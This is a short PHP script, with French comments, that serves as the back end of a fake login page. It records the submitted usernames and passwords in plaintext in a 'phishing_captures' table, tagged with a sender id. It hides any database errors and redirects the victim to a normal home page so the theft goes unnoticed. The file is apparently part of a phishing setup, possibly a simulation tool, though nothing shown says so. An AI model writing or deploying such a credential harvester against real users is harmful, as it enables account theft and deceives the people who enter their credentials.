<?php
// fake_login/capturer.php
session_start();
require_once '../traitements/db.php'; 

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Récupération avec les nouveaux noms fake_user et fake_pass
    $identifiant = $_POST['fake_user'] ?? 'Inconnu';
    $mot_de_passe = $_POST['fake_pass'] ?? 'Non fourni';
    $sender_id = isset($_GET['sender']) ? intval($_GET['sender']) : 1;

    // Sauvegarde sécurisée
    try {
        $stmt = $conn->prepare("INSERT INTO phishing_captures (captured_username, captured_password, sender_id, captured_at) VALUES (?, ?, ?, NOW())");
        $stmt->bind_param("ssi", $identifiant, $mot_de_passe, $sender_id);
        $stmt->execute();
    } catch (Exception $e) {
        // En cas d'erreur BDD, on continue discrètement
    }

    // Redirection finale
    header("Location: ../index_home.php");
    exit();
}
?>